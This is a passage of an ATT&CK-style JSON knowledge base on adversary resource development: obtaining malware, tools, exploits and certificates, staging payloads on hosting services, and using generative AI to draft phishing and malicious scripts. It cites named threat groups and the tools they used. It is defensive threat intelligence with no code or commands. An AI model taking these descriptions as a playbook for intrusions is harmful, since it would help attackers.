infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\nCreating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.", "id": "T1585.003", "examples": []}]}, {"name": "Obtain Capabilities", "description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.", "detailed_description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.", "id": "T1588", "examples": [], "sub_techniques": [{"name": "Malware", "description": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.", "detailed_description": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).", "id": "T1588.001", "examples": [{"id": "G0138", "name": "Andariel", "description": "Andariel has used a variety of publicly-available remote access Trojans (RATs) for its operations."}, {"id": "G0006", "name": "APT1", "description": "APT1 used publicly available malware for privilege escalation."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has acquired and used njRAT in its operations."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations."}, {"id": "C0015", "name": "C0015", "description": "For C0015, the threat actors used Cobalt Strike and Conti ransomware."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has acquired and used a variety of malware, including Cobalt Strike."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has acquired malware and related tools from dark web forums."}, {"id": "C0007", "name": "FunnyDream", "description": "For FunnyDream, the threat actors used a new backdoor named FunnyDream."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ acquired and used the Redline password stealer in their operations."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used a variety of open-source remote access Trojans for its operations."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has obtained and used malware such as Cobalt Strike."}, {"id": "G1013", "name": "Metador", "description": "Metador has used unique malware in their operations, including metaMain and Mafalda."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used Trojans from underground hacker websites."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors obtained malware, including Remcos, njRAT, and AsyncRAT."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used multiple strains of malware available for purchase on criminal forums or in open-source repositories."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used malware such as Azorult and Cobalt Strike in their operations."}, {"id": "G0010", "name": "Turla", "description": "Turla has used malware obtained after compromising other threat actors, such as OilRig."}]}, {"name": "Tool", "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.", "detailed_description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).", "id": "T1588.002", "examples": [{"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon obtained the Heyoka open source exfiltration tool and subsequently modified it for their operations."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 obtained and used a modified variant of Imminent Monitor."}, {"id": "G0006", "name": "APT1", "description": "APT1 has used various open-source tools for privilege escalation purposes."}, {"id": "G0073", "name": "APT19", "description": "APT19 has obtained and used publicly-available tools like Empire."}, {"id": "G0007", "name": "APT28", "description": "APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder."}, {"id": "G0016", "name": "APT29", "description": "APT29 has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike."}, {"id": "G0050", "name": "APT32", "description": "APT32 has obtained and used tools such as Mimikatz and Cobalt Strike, and a variety of other open-source tools from GitHub."}, {"id": "G0064", "name": "APT33", "description": "APT33 has obtained and leveraged publicly-available tools for early intrusion activities."}, {"id": "G0082", "name": "APT38", "description": "APT38 has obtained and used open-source tools such as Mimikatz."}, {"id": "G0087", "name": "APT39", "description": "APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz."}, {"id": "G0096", "name": "APT41", "description": "APT41 has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has acquired and used Cobalt Strike in its operations."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has obtained tools such as PuTTY for use in their operations."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has obtained and used tools such as Putty, SNScan, and PsExec for its operations."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has obtained and used tools such as Mimikatz."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has obtained and used open-source tools such as Mimikatz, gsecdump, and Windows Credential Editor."}, {"id": "C0010", "name": "C0010", "description": "For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2."}, {"id": "C0015", "name": "C0015", "description": "For C0015, the threat actors obtained a variety of tools, including AdFind,  AnyDesk, and Process Hacker."}, {"id": "C0017", "name": "C0017", "description": "For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato."}, {"id": "C0018", "name": "C0018", "description": "For C0018, the threat actors acquired a variety of open source tools, including Mimikatz, Sliver, SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy."}, {"id": "C0021", "name": "C0021", "description": "For C0021, the threat actors used Cobalt Strike configured with a modified variation of the publicly available Pandora Malleable C2 Profile."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles obtained and used tools such as Mimikatz and PsExec."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak has obtained and used open-source tools such as PsExec and Mimikatz."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used open-source tools including customized versions of the Iox proxy tool, NPS tunneling tool, Meterpreter, and a keylogger that uploads data to Alibaba cloud storage."}, {"id": "G0003", "name": "Cleaver", "description": "Cleaver has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens has used Metasploit, Empire, and AirVPN for post-exploitation activities."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors obtained open source tools to use in their operations."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors leveraged tools including Interactsh to identify vulnerable targets, PySoxy to simultaneously dispatch traffic between multiple endpoints, BusyBox to enable post exploitation activities, and Kubo Injector to inject shared objects into process memory."}, {"id": "G0079", "name": "DarkHydrus", "description": "DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has acquired and used a variety of open source tools."}, {"id": "G0137", "name": "Ferocious Kitten", "description": "Ferocious Kitten has obtained open source tools for its operations, including JsonCPP and Psiphon."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has relied on publicly-available software to gain footholds and establish persistence in victim environments."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized publicly available tools such as Mimikatz, Impacket, PWdump7, ProcDump, Nmap, and Incognito V2 for targeting efforts."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has obtained and used tools such as Mimikatz, Cobalt Strike, and AdFind."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has utilized a variety of tools such as Cobalt Strike, PowerSploit, and the remote management tool, Atera for targeting efforts."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used open-source tools such as Impacket for targeting efforts."}, {"id": "C0001", "name": "Frankenstein", "description": "For Frankenstein, the threat actors obtained and used Empire."}, {"id": "C0007", "name": "FunnyDream", "description": "For FunnyDream, the threat actors used a modified version of the open source PcShare remote administration tool."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used various legitimate tools, such as mshta.exe and Reg, and services during operations."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group has obtained and used tools such as QuasarRAT and Remcos."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has acquired, and sometimes customized, open source tools such as Mimikatz, Empire, VNC remote access software, and DIG.net."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has acquired and used several tools including MegaSync, AnyDesk,  esentutl and PsExec."}, {"id": "G0100", "name": "Inception", "description": "Inception has obtained and used open-source tools such as LaZagne."}, {"id": "G0136", "name": "IndigoZebra", "description": "IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has obtained and used tools such as Mimikatz."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has obtained and used tools such as Nirsoft WebBrowserPassVIew, Mimikatz, and PsExec."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has obtained tools such as RVTools and AD Explorer for their operations."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has obtained a variety of tools for their operations, including Responder and PuTTy PSCP."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has obtained an ARP spoofing tool from GitHub."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has obtained and used tools like Havij, sqlmap, Metasploit, Mimikatz, and Plink."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump."}, {"id": "G1013", "name": "Metador", "description": "Metador has used Microsoft's Console Debugger in some of their operations."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has used the commercial tool DiskCryptor."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used legitimate tools ConnectWise, RemoteUtilities, and SimpleHelp to gain access to the target environment."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors obtained and used tools such as gsecdump."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "For Operation CuckooBees, the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors obtained packers such as CyaX."}, {"id": "C0014", "name": "Operation Wocao", "description": "For Operation Wocao, the threat actors obtained a variety of open source tools, including JexBoss, KeeThief, and BloodHound."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has obtained and used open-source tools such as QuasarRAT."}, {"id": "G0011", "name": "PittyTiger", "description": "PittyTiger has obtained and used tools such as Mimikatz and gsecdump."}, {"id": "G1040", "name": "Play", "description": "Play has used multiple tools for discovery and defense evasion purposes on compromised hosts."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has obtained and used tools such as AirVPN and plink in their operations."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has acquired open-source tools for their operations, including Invoke-PSImage, which was used to establish an encrypted channel from a compromised host to Sandworm Team's C2 server in preparation for the 2018 Winter Olympics attack, as well as Impacket and RemoteExec, which were used in their 2022 Prestige operations. Additionally, Sandworm Team has used Empire, Cobalt Strike and PoshC2."}, {"id": "G0091", "name": "Silence", "description": "Silence has obtained and modified versions of publicly-available tools like Empire and PsExec. "}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has incorporated the open-source EvilGinx framework into their spearphishing activity."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used commodity remote access tools."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used a variety of tools in their operations, including AdFind, BloodHound, Mimikatz, and PowerSploit."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor."}, {"id": "G0076", "name": "Thrip", "description": "Thrip has obtained and used tools such as Mimikatz and PsExec."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles used tools such as Mimikatz and other open-source software."}, {"id": "G0010", "name": "Turla", "description": "Turla has obtained and customized publicly-available tools like Mimikatz."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used legitimate network and forensic tools and customized versions of open-source tools for C2."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has obtained and used tools such as Mimikatz."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has obtained and used Empire for post-exploitation activities."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has utilized tools such as Empire, Cobalt Strike, Cobalt Strike, Rubeus, AdFind, BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts."}]}, {"name": "Code Signing Certificates", "description": "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.", "detailed_description": "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\nPrior to Code Signing, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.", "id": "T1588.003", "examples": [{"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used stolen code signing certificates to sign DUSTTRAP malware and components."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used stolen code-signing certificates for its malicious payloads."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used tools with legitimate code signing certificates. "}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has used code signing certificates issued to fake companies to bypass security controls."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads."}]}, {"name": "Digital Certificates", "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.", "detailed_description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if the certificate is trusted or otherwise added to the root of trust (i.e. Install Root Certificate). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities. Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.\nAfter obtaining a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.", "id": "T1588.004", "examples": [{"id": "G0098", "name": "BlackTech", "description": "BlackTech has used valid, stolen digital certificates for some of their malware and tools."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has obtained SSL certificates for their C2 domains."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used a valid digital certificate for some of their malware."}, {"id": "C0006", "name": "Operation Honeybee", "description": "For Operation Honeybee, the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages."}]}, {"name": "Exploits", "description": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.", "detailed_description": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).", "id": "T1588.005", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has obtained exploitation scripts against publicly-disclosed vulnerabilities from public repositories."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has obtained exploit code for various CVEs."}]}, {"name": "Vulnerabilities", "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.", "detailed_description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).", "id": "T1588.006", "examples": [{"id": "G0034", "name": "Sandworm Team", "description": "In 2017, Sandworm Team conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used publicly available exploit code for initial access."}]}, {"name": "Artificial Intelligence", "description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.", "detailed_description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing/Phishing for Information campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting Develop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., Obfuscated Files or Information) malicious scripts and payloads.", "id": "T1588.007", "examples": []}]}, {"name": "Stage Capabilities", "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.", "detailed_description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):", "id": "T1608", "examples": [{"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used servers under their control to validate tracking pixels sent to phishing victims."}], "sub_techniques": [{"name": "Upload Malware", "description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.", "detailed_description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.", "id": "T1608.001", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has registered domains to stage payloads."}, {"id": "C0010", "name": "C0010", "description": "For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system."}, {"id": "C0011", "name": "C0011", "description": "For C0011, Transparent Tribe hosted malicious documents on domains registered by the group."}, {"id": "C0021", "name": "C0021", "description": "For C0021, the threat actors uploaded malware to websites under their control."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has staged malware and malicious files on compromised web servers, GitHub, and Google Drive."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY  has uploaded malicious payloads to file-sharing services including TransferNow, TransferXL, WeTransfer, and OneDrive."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has registered domains to stage payloads."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has staged malware on fraudulent websites set up to impersonate targeted organizations."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used compromised and acquired infrastructure to host and deliver malware including Blogspot to host beacons, file exfiltrators, and implants."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has hosted open-source remote access Trojans used in its operations in GitHub."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has hosted malicious payloads on Dropbox."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet staged malicious capabilities online for follow-on download by victims or malware."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has hosted malicious payloads on DropBox including PlugX."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has hosted payloads on acquired second-stage servers for periods of either days, weeks, or months."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors uploaded commonly available hacker tools to compromised web servers."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group used compromised servers to host malware."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "For Operation Sharpshooter, the threat actors staged malicious files on Dropbox and other websites."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has used the Discord content delivery network for hosting malicious content referenced in links and emails."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team staged compromised versions of legitimate software installers in forums to enable initial access to executing user."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has used compromised domains to host its malicious payloads."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has uploaded malicious payloads to cloud storage sites."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub."}, {"id": "G0092", "name": "TA505", "description": "TA505 has staged malware on actor-controlled domains."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has uploaded backdoored Docker images to Docker Hub."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has hosted malicious payloads on Dropbox."}]}, {"name": "Upload Tool", "description": "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.", "detailed_description": "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\nTools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire 